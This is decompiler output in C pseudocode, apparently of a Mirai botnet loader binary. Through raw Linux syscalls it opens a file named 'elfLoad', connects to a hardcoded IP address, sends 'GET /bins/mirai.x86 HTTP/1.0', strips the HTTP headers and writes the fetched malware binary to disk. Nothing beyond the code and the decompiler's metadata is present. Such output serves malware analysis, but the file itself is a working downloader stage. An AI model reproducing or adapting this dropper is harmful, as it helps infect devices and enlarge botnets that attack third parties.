//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) 2018 Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>

// ------------------- Function Prototypes --------------------

int32_t entry_point(void);
int32_t function_8048094(unsigned char a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_80480dc(int32_t a1);
int32_t function_80480f1(int32_t a1);
int32_t function_8048103(int32_t a1, int32_t a2, int32_t a3);
int32_t function_804811b(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_8048142(int32_t a1, int32_t a2, int32_t a3);
int32_t function_804815a(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_8048172(int32_t a1, int32_t a2, int32_t a3);
int32_t function_8048199(void);
int32_t function_804832c(int32_t a1, int32_t a2);
int32_t function_8048373(void);

// ------------------------ Functions -------------------------

// Address range: 0x8048094 - 0x80480db
int32_t function_8048094(unsigned char a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = 0;
    // entry
    return 0x1000000 * a4 | 0x10000 * a3 & 0xff0000 | 256 * a2 & 0xff00 | (int32_t)a1;
}

// Address range: 0x80480dc - 0x80480f0
int32_t function_80480dc(int32_t a1) {
    int32_t v1;
    // 0x80480dc
    return function_804832c(1, a1);
}

// Address range: 0x80480f1 - 0x8048102
int32_t function_80480f1(int32_t a1) {
    int32_t v1;
    // 0x80480f1
    return function_804832c(6, a1);
}

// Address range: 0x8048103 - 0x804811a
int32_t function_8048103(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    // 0x8048103
    return function_804832c(5, a1);
}

// Address range: 0x804811b - 0x8048141
int32_t function_804811b(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1;
    // 0x804811b
    return function_804832c(102, 3);
}

// Address range: 0x8048142 - 0x8048159
int32_t function_8048142(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    // 0x8048142
    return function_804832c(4, a1);
}

// Address range: 0x804815a - 0x8048171
int32_t function_804815a(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1;
    // 0x804815a
    return function_804832c(3, a1);
}

// Address range: 0x8048172 - 0x8048198
int32_t function_8048172(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1;
    // 0x8048172
    return function_804832c(102, 1);
}

// Address range: 0x8048199 - 0x8048320
int32_t function_8048199(void) {
    int32_t v1;
    int32_t v2 = (int32_t)"x86"; // 0x80481ac12
    // branch -> 0x80481ac
    char v3; // 0x80481ad
    while (v3 != 0) {
        // 0x80481ac
        v2++;
        // continue -> 0x80481ac
    }
    // 0x80481b2
    function_8048142(1, (int32_t)"MIRAI\n", 6);
    int32_t v4 = 2; // bp-36
    function_8048094(46, 243, 189, 109);
    int32_t v5 = function_8048103((int32_t)"elfLoad", 577, 511); // edi
    int32_t v6 = function_8048172(2, 1, 0); // 0x8048210
    int32_t v7;
    char v8; // bp-17
    int32_t v9; // 0x804828f18
    int32_t v10; // 0x804826a
    int32_t v11; // 0x8048290
    int32_t v12; // 0x8048274
    int32_t v13; // 0x8048239
    if (v6 != -1) {
        // 0x804821f
        int32_t v14; // 0x8048231
        if (v5 == -1) {
            // 0x8048224
            v14 = function_80480dc(1);
            // branch -> 0x8048231
        } else {
            v14 = v6;
        }
        // 0x8048231
        v13 = function_804811b(v6, (int32_t)&v4, 16, 0x1000000 * v14 / 0x1000000);
        if (v13 < 0) {
            // 0x8048247
            function_8048142(1, (int32_t)"NIF\n", 4);
            function_80480dc(-v13);
            // branch -> 0x8048263
        }
        // 0x8048263
        v10 = v2 - 0x804835b;
        v12 = function_8048142(v6, (int32_t)"GET /bins/mirai.x86 HTTP/1.0\r\n\r\n", v10);
        v9 = v12;
        if (v12 != v10) {
            // 0x8048280
            v9 = function_80480dc(3);
            // branch -> 0x804828d
        }
        // 0x804828d
        v7 = 0;
        v11 = &v8;
        // branch -> 0x804828f
        while (true) {
            // 0x804828f
            if (function_804815a(v6, v11, 1, 0x1000000 * v9 / 0x1000000) != 1) {
              lab_0x80482a2:
                // 0x80482a2
                function_80480dc(4);
                // branch -> 0x80482af
            }
          lab_0x80482af:;
            int32_t v15 = v8; // 0x80482af
            int32_t v16 = 256 * v7 | v15; // 0x80482b6
            v7 = v16;
            if (v16 == 0xd0a0d0a) {
                // break -> 0x80482c0
                break;
            }
            v9 = v15;
            // continue -> 0x804828f
        }
        // 0x80482c0
        int32_t v17; // bp-164
        int32_t v18 = &v17; // 0x80482c0
        int32_t v19;
        int32_t v20 = function_804815a(v6, v18, 128, 0x1000000 * v19 / 0x1000000); // 0x80482ce47
        if (v20 < 1) {
            // 0x80482e8
            function_80480f1(v6);
            function_80480f1(v5);
            function_8048142(1, (int32_t)"FIN\n", 4);
            return function_80480dc(5);
        }
        function_8048142(v5, v18, v20);
        int32_t v21 = function_804815a(v6, v18, 128, 0x1000000 * v19 / 0x1000000); // 0x80482ce
        while (v21 >= 1) {
            // 0x80482da
            function_8048142(v5, v18, v21);
            v21 = function_804815a(v6, v18, 128, 0x1000000 * v19 / 0x1000000);
            // continue -> 0x80482da
        }
        // 0x80482e8
        function_80480f1(v6);
        function_80480f1(v5);
        function_8048142(1, (int32_t)"FIN\n", 4);
        return function_80480dc(5);
    }
    int32_t v22 = function_80480dc(1); // 0x8048229
    // branch -> 0x8048231
    // 0x8048231
    v13 = function_804811b(v6, (int32_t)&v4, 16, 0x1000000 * v22 / 0x1000000);
    if (v13 < 0) {
        // 0x8048247
        function_8048142(1, (int32_t)"NIF\n", 4);
        function_80480dc(-v13);
        // branch -> 0x8048263
    }
    // 0x8048263
    v10 = v2 - 0x804835b;
    v12 = function_8048142(v6, (int32_t)"GET /bins/mirai.x86 HTTP/1.0\r\n\r\n", v10);
    v9 = v12;
    if (v12 != v10) {
        // 0x8048280
        v9 = function_80480dc(3);
        // branch -> 0x804828d
    }
    // 0x804828d
    v7 = 0;
    v11 = &v8;
    // branch -> 0x804828f
    while (true) {
        // 0x804828f
        if (function_804815a(v6, v11, 1, 0x1000000 * v9 / 0x1000000) == 1) {
            goto lab_0x80482af;
        }
        goto lab_0x80482a2;
    }
}

// Address range: 0x8048321 - 0x804832b
int32_t entry_point(void) {
    int32_t v1;
    // entry
    return function_8048199();
}

// Address range: 0x804832c - 0x8048372
int32_t function_804832c(int32_t a1, int32_t a2) {
    int32_t v1;
    uint32_t result = int80_syscall(a1); // 0x804834c
    if (result < 0xfffff001) {
        // 0x804835d
        return result;
    }
    // 0x804835e
    function_8048373();
    return -1;
}

// Address range: 0x8048373 - 0x8048378
int32_t function_8048373(void) {
    // 0x8048373
    int32_t v1;
    return &v1;
}

// ------------------ System-Call Functions -------------------

// int int80_syscall(int sysCallCode);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (3.4.6)
// Detected functions: 12
// Decompilation date: 2018-03-24 22:28:58
